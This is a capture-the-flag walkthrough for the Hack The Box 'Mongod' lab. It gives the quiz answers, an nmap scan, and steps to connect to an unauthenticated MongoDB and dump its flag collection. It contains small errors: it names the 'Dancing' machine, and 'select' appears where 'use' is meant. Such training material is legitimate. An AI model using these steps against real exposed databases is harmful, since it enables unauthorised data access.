## Quick Links
[HTB - Starting Point](https://app.hackthebox.com/starting-point)  
[Mongod Walkthrough](blob:https://app.hackthebox.com/bbc9ad4a-b2e3-4663-8fdc-e114edae0e05) 

## Preparation
1. Connect to the *Starting Point* VPN. See the [[Preparation]] documentation for instructions.
2. Spawn the *Dancing* machine in the *Starting Point* list.
3. Set a variable for the target machine's IP
	1. `export TARGET=<ip_address_of_target>`
	2. `echo $TARGET`
	3. `ping $TARGET` 

## Tasks
1. How many TCP ports are open on the machine?
	1. *Answer*: 2
	2. Run `nmap -p- --min-rate=1000 -sV $TARGET`
2. Which service is running on port 27017 of the remote host?
	1. *Answer*: MongoDB 3.6.8
3. What type of database is MongoDB? (Choose: SQL or NoSQL)
	1. *Answer*: NoSQL
4. What is the command name for the Mongo shell that is installed with the mongodb-clients package?
	1. *Answer*: mongo
5. What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)
	1. *Answer*: show dbs
6. What is the command used for listing out the collections in a database? (No need to include a trailing ;)
	1. *Answer*: show collections
7. What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?
	1. *Answer*: db.flag.find().pretty()
8. Submit root flag
	1. Ping the machine to verify connection
	2. Run a scan to see which ports and services are open and running:
		1. `nmap -p- --min-rate=1000 -sV $TARGET`
	3. Disconnect from the HTB VPN and install the Mongo Client
		1. Download the tar file: `curl -O https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-3.4.7.tgz`
		2. Unpack the tar file: `tar xvf mongodb-linux-x86_64-3.4.7.tgz`
		3. Navigate to where the mongo binary lives: `cd mongodb-linux-x86_64-3.4.7/bin`
	4. Try to connect to the remote MongoDB server
		1. `./mongo mongodb://{target_IP}:27017`
	5. Explore the data in the database
		1. `show dbs` shows there is a database called *sensitive_information*
		2. `select sensitive_information` selects the database
		3. `show collections` will show the *flag* collection that database
	6. To view the data in a MongoDB collection, the data needs to be parsed
		1. `db.flag.find().pretty();`
		2. This prints the key:value pair for the flag data
	7. Copy and paste the flag into HTB.
	8. Success: Machine Pwned!